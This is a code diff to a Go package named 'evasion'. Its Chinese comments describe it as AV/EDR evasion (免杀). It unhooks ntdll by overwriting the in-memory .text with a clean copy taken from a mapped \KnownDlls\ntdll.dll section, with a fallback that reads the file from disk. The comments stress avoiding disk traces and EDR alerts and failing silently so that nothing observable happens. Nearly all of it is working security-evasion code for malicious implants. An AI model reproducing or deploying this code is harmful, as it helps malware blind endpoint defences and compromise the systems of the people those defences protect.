@@ -20,6 +20,7 @@ package evasion
 
 import (
 	"errors"
+	"fmt"
 	"path/filepath"
 
 	"golang.org/x/sys/windows"
@@ -95,31 +96,22 @@ func writeGoodBytes(b []byte, pn string, virtualoffset uint32, secname string, v
 // 守卫：磁盘节与内存节的 .text VirtualSize 不一致（补丁版本失配）即放弃，防越界写崩；
 // 任何失败静默返回（调用方 recover 兜底），不产生可观测行为差异。
 // 已知边界：EDR 对 ntdll .text 有完整性校验时本动作自身可触发告警（上位文档 R-2 风险条款）。
+// UnhookNtdll —— 启动早期 ntdll 自恢复（免杀 R-2 v1 + R-2.2，方案：
+// docs/运行时免杀R组实施方案-SleepCrypt与Unhooking.md §二·R-2）：
+// 干净 .text 来源优先级：① \KnownDlls\ntdll.dll section 映射（R-2.2，无磁盘读取
+// 痕迹——对象管理器启动时已以 SEC_IMAGE 映射，内容即内核加载的原始映像）；
+// ② System32 磁盘文件回退（R-2 v1）。两路均做 size 对账（补丁版本失配即放弃，
+// 防越界写崩）；任何失败静默返回（调用方 recover 兜底），不产生可观测行为差异。
 func UnhookNtdll() error {
-	sysDir, err := windows.GetSystemDirectory()
+	clean, cleanSize, err := unhookFromKnownDlls()
+	if err != nil {
+		clean, cleanSize, err = unhookFromDisk()
+	}
 	if err != nil {
 		return err
-	}
-	diskPath := filepath.Join(sysDir, "ntdll.dll")
-
-	f, err := pe.Open(diskPath)
-	if err != nil {
-		return err
-	}
-	defer f.Close()
-	diskSec := f.Section(".text")
-	if diskSec == nil {
-		return errors.New("evasion: disk ntdll has no .text section")
-	}
-	diskData, err := diskSec.Data()
-	if err != nil {
-		return err
-	}
-	if diskSec.VirtualSize == 0 || uint64(len(diskData)) < uint64(diskSec.VirtualSize) {
-		return errors.New("evasion: disk .text raw data smaller than virtual size")
 	}
 
-	dll, err := windows.LoadDLL(diskPath) // ntdll 已加载 → 返回现有模块基址
+	dll, err := windows.LoadDLL("ntdll.dll") // ntdll 已加载 → 返回现有模块基址
 	if err != nil {
 		return err
 	}
@@ -129,8 +121,8 @@ func UnhookNtdll() error {
 	if !ok {
 		return errors.New("evasion: memory ntdll .text not found")
 	}
-	if memSize != diskSec.VirtualSize {
-		// 内存与磁盘版本失配：放弃覆盖（防越界写崩），交由调用方静默
+	if memSize != cleanSize {
+		// 内存与干净映像版本失配：放弃覆盖（防越界写崩），交由调用方静默
 		return errors.New("evasion: ntdll version mismatch, skip unhook")
 	}
 
@@ -139,13 +131,93 @@ func UnhookNtdll() error {
 	if err = windows.VirtualProtect(dst, uintptr(memSize), windows.PAGE_EXECUTE_READWRITE, &old); err != nil {
 		return err
 	}
-	// RtlMoveMemory 拷贝磁盘 .text → 内存 .text（size 已对账，无越界）
-	nt, _, _ := procRtlMoveMemory.Call(dst, uintptr(unsafe.Pointer(&diskData[0])), uintptr(memSize))
-	if nt != 0 {
-		// RtlMoveMemory 无返回值（void），nt 恒为其首参数误读——仅作占位
-		_ = nt
-	}
+	// RtlMoveMemory 拷贝干净 .text → 内存 .text（size 已对账，无越界）
+	procRtlMoveMemory.Call(dst, uintptr(unsafe.Pointer(&clean[0])), uintptr(memSize))
 	return windows.VirtualProtect(dst, uintptr(memSize), old, &old)
+}
+
+// unhookFromKnownDlls 经 \KnownDlls\ntdll.dll section 映射取干净 .text（R-2.2）。
+func unhookFromKnownDlls() ([]byte, uint32, error) {
+	sectionPath := `\KnownDlls\ntdll.dll`
+	ustr := ntUnicodeString{
+		Length:        uint16(len(sectionPath) * 2),
+		MaximumLength: uint16(len(sectionPath)*2 + 2),
+		Buffer:        uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(sectionPath))),
+	}
+	objAttr := ntObjectAttributes{
+		Length:     uint32(unsafe.Sizeof(ntObjectAttributes{})),
+		Attributes: ntObjCaseInsensitive,
+		ObjectName: &ustr,
+	}
+	var hSection uintptr
+	secStatus, _, _ := procNtCreateSection.Call(
+		uintptr(unsafe.Pointer(&hSection)),
+		uintptr(ntSectionMapRead|ntSectionMapExecute),
+		uintptr(unsafe.Pointer(&objAttr)),
+		0,                       // MaximumSize（映射已存在 section 时忽略）
+		uintptr(ntPageReadOnly), // Protection
+		uintptr(ntSecImage),     // AllocationAttributes: SEC_IMAGE
+		0,                       // FileHandle（KnownDlls 命名 section 无需）
+	)
+	if secStatus != 0 {
+		return nil, 0, fmt.Errorf("evasion: NtCreateSection ntstatus=0x%x", secStatus)
+	}
+	defer windows.CloseHandle(windows.Handle(hSection))
+
+	var base uintptr
+	var viewSize uintptr
+	mapStatus, _, _ := procNtMapViewOfSection.Call(
+		hSection,
+		uintptr(ntCurrentProcess),
+		uintptr(unsafe.Pointer(&base)),
+		0, // ZeroBits
+		0, // CommitSize
+		0, // SectionOffset
+		uintptr(unsafe.Pointer(&viewSize)),
+		uintptr(ntViewShare),
+		0, // AllocationType
+		uintptr(ntPageReadOnly),
+	)
+	if mapStatus != 0 {
+		return nil, 0, fmt.Errorf("evasion: NtMapViewOfSection ntstatus=0x%x", mapStatus)
+	}
+	defer procNtUnmapViewOfSection.Call(uintptr(ntCurrentProcess), base)
+
+	va, vsize, ok := imageSectionInfo(base, ".text")
+	if !ok || vsize == 0 {
+		return nil, 0, errors.New("evasion: knownDlls ntdll .text not found")
+	}
+	clean := make([]byte, vsize)
+	copy(clean, unsafe.Slice((*byte)(unsafe.Pointer(base+uintptr(va))), uintptr(vsize)))
+	return clean, vsize, nil
+}
+
+// unhookFromDisk 磁盘回退（R-2 v1）：System32\ntdll.dll 读取 .text。
+// 边界：部分 EDR 监控对 ntdll.dll 文件的打开动作——故仅作 KnownDlls 失败时的回退。
+func unhookFromDisk() ([]byte, uint32, error) {
+	sysDir, err := windows.GetSystemDirectory()
+	if err != nil {
+		return nil, 0, err
+	}
+	diskPath := filepath.Join(sysDir, "ntdll.dll")
+
+	f, err := pe.Open(diskPath)
+	if err != nil {
+		return nil, 0, err
+	}
+	defer f.Close()
+	diskSec := f.Section(".text")
+	if diskSec == nil {
+		return nil, 0, errors.New("evasion: disk ntdll has no .text section")
+	}
+	diskData, err := diskSec.Data()
+	if err != nil {
+		return nil, 0, err
+	}
+	if diskSec.VirtualSize == 0 || uint64(len(diskData)) < uint64(diskSec.VirtualSize) {
+		return nil, 0, errors.New("evasion: disk .text raw data smaller than virtual size")
+	}
+	return diskData[:diskSec.VirtualSize], diskSec.VirtualSize, nil
 }
 
 // imageSectionInfo 解析内存 PE 头，返回指定节的 VirtualAddress/VirtualSize。
@@ -166,4 +238,37 @@ func imageSectionInfo(base uintptr, want string) (va, vsize uint32, ok bool) {
 	return 0, 0, false
 }
 
-var procRtlMoveMemory = windows.NewLazyDLL("ntdll.dll").NewProc("RtlMoveMemory")
+var ntdll = windows.NewLazyDLL("ntdll.dll")
+
+var (
+	procRtlMoveMemory        = ntdll.NewProc("RtlMoveMemory")
+	procNtCreateSection      = ntdll.NewProc("NtCreateSection")
+	procNtMapViewOfSection   = ntdll.NewProc("NtMapViewOfSection")
+	procNtUnmapViewOfSection = ntdll.NewProc("NtUnmapViewOfSection")
+)
+
+// NT 原生接口（R-2.2 KnownDlls section 映射）：x64 结构与常量。
+type ntUnicodeString struct {
+	Length        uint16
+	MaximumLength uint16
+	Buffer        uintptr
+}
+
+type ntObjectAttributes struct {
+	Length                   uint32
+	RootDirectory            uintptr
+	ObjectName               *ntUnicodeString
+	Attributes               uint32
+	SecurityDescriptor       uintptr
+	SecurityQualityOfService uintptr
+}
+
+const (
+	ntCurrentProcess     = ^uintptr(0) // (HANDLE)-1
+	ntSectionMapRead     = 0x0004
+	ntSectionMapExecute  = 0x0008
+	ntObjCaseInsensitive = 0x0040
+	ntSecImage           = 0x1000000
+	ntViewShare          = 1
+	ntPageReadOnly       = 0x02
+)
